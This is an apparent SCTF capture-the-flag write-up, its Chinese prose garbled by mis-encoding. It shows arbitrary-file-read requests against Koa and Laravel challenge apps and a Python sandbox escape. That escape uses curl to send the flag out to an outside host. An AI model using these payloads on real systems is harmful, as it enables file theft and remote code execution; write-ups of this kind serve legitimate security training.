<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;dc62d163f53ce13369ab97041706060c&quot;</span></span><br><span class="line">Content-Length: <span class="number">1547</span></span><br><span class="line">Last-Modified: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">45</span> GMT</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"><span class="attr">Date</span>: Sat, <span class="number">04</span> Jul <span class="number">2020</span> <span class="number">05</span>:<span class="number">14</span>:<span class="number">50</span> GMT</span><br><span class="line"><span class="attr">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> koaBody = <span class="built_in">require</span>(<span class="string">&#x27;koa-body&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">&#x27;koa-send&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> Router();</span><br><span class="line"><span class="keyword">const</span> SECRET = <span class="string">&quot;03229a6694e657077f218c322f3e0bea&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(koaBody(&#123;</span><br><span class="line">  <span class="attr">multipart</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">formidable</span>: &#123;</span><br><span class="line">      <span class="attr">maxFileSize</span>: <span class="number">2000</span> * <span class="number">1024</span> * <span class="number">1024</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/uploadfile&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line">  <span class="keyword">if</span> (!fs.existsSync(file.path)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(file.path.toString().search(<span class="string">&quot;/fd/&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">    file.path=<span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">  <span class="keyword">let</span> fileId = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(file.name + <span class="built_in">Date</span>.now() + SECRET).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> filePath = path.join(__dirname, <span class="string">&#x27;upload/&#x27;</span>) + fileId</span><br><span class="line">  <span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br><span class="line">  reader.pipe(upStream)</span><br><span class="line">  <span class="keyword">return</span> ctx.body = <span class="string">&quot;Upload success ~, your fileId is hereÃ¯Â¼Âš&quot;</span> + fileId;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/downloadfile/:fileId&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> fileId = ctx.params.fileId;</span><br><span class="line">  ctx.attachment(fileId);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, fileId, &#123; <span class="attr">root</span>: __dirname + <span class="string">&#x27;/upload&#x27;</span> &#125;);</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;SCTF&#123;no_such_file_~&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.response.type = <span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">  ctx.response.body = fs.createReadStream(<span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(router.routes());</span><br><span class="line">app.listen(<span class="number">3333</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;This server is running at http://localhost:&#x27;</span> + <span class="number">3333</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºkoaä¸­è®¿é—®å‚æ•°ä¹Ÿæ˜¯ctx.request.body.xxxx æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /uploadfile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3333</span><br><span class="line">Content-Length: 77</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://127.0.0.1:3333</span><br><span class="line">Referer: http://127.0.0.1:3333/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;files&quot;:&#123;&quot;file&quot;:&#123;&quot;path&quot;:&quot;flag&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p>
<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>,<span class="string">&quot;IndexController@init&quot;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/rm&#x27;</span>,<span class="string">&quot;IndexController@rm&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>,<span class="string">&quot;IndexController@upload&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/move/log/&#123;filename&#125;&#x27;</span>, <span class="string">&#x27;IndexController@moveLog&#x27;</span>)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;192.168.&quot;</span>) !== <span class="number">0</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;10.&quot;</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;admin only&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;rmdir&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;unlink&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>],base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> =date(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$opts</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;method&#x27;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span>=&gt;<span class="number">1</span>,<span class="comment">//å•ä½ç§’</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&quot;http://127.0.0.1/tmp/&quot;</span>.md5(<span class="string">&#x27;127.0.0.1&#x27;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="literal">false</span>,stream_context_create(<span class="variable">$opts</span>));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>storage_path(â€œlogsâ€):/var/www/html/storage/logs</p>
<p>upload dir : /var/tmp/md5(IP)/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å› ä¸ºä¸¤ä¸ª../æœåŠ¡å™¨ä¸ä¼šè§£æç›´æ¥æŠ¥é”™çš„åŸå› æ— æ³•ç©¿åˆ°æ ¹ç›®å½•ï¼Œåæ¥æƒ³åˆ°åœ¨å¼„ä¸ªindex.phpå°±å¥½äº†<br>æœ€åçš„payload:<a target="_blank" rel="noopener" href="http://39.104.93.188/flag">http://39.104.93.188/index.php/tmp/../../flag</a></p>
<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span>():</span></span><br><span class="line">    secret = request.form[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exec</span>(secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xXXxXXx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ç¯å¢ƒï¼š<a target="_blank" rel="noopener" href="http://ccreater.top:60011/">http://ccreater.top:60011/</a><br>ç¦ç”¨å­—ç¬¦ï¼š</p>
<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
<p>åˆ©ç”¨é­”æœ¯æ–¹æ³•? : <code>__getitem__,__getattr__</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br></pre></td></tr></table></figure>

<h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="ä¸ºä½•payloadèƒ½è¿è¡Œ"><a href="#ä¸ºä½•payloadèƒ½è¿è¡Œ" class="headerlink" title="ä¸ºä½•payloadèƒ½è¿è¡Œ"></a>ä¸ºä½•payloadèƒ½è¿è¡Œ</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“python è°ƒç”¨ç±»æ–¹æ³•çš„æ—¶å€™ä¼šä¼ å…¥<code>self</code>å‚æ•°ï¼Œè€Œæˆ‘ä»¬è°ƒç”¨<code>app.config==request.args.a</code>åº”è¯¥ä¹Ÿä¼šä¼ å…¥selfå‚æ•°ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æˆåŠŸ</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>():</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">a = A()</span><br><span class="line">a.__class__.__eq__=<span class="built_in">eval</span></span><br><span class="line">a==<span class="string">&quot;print(123)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬è·Ÿè¿›pythonåº•å±‚çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
<p>è¿™é‡Œæ˜¾ç¤ºnargsæ˜¾ç¤ºåªæœ‰1ä¸ªå‚æ•°ï¼Œå‚çœ‹å †æ ˆï¼Œè·Ÿè¸ªåˆ°æœ€å¼€å§‹çš„åœ°æ–¹</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
<p>è¿™é‡Œæˆ‘ä»¬ç¡®å®ä¼ å…¥äº†self,å…¶ä¸­væ˜¯<code>self</code>,wæ˜¯<code>print(123)</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
<p>åœ¨<code>call_unbound</code>å¤„æˆ‘ä»¬å‘ç°äº†åŸå› ï¼Œæ˜¯å› ä¸ºubound==0</p>
<p>åœ¨<code>lookup_maybe_method</code>ä¸­è®¾ç½®äº†uboundçš„å€¼</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
<blockquote>
<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
</blockquote>
<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.41.124/public/log.txt</span><br><span class="line">http://39.99.41.124/public/test/</span><br><span class="line">http://39.99.41.124/public/nationalsb/login.php</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
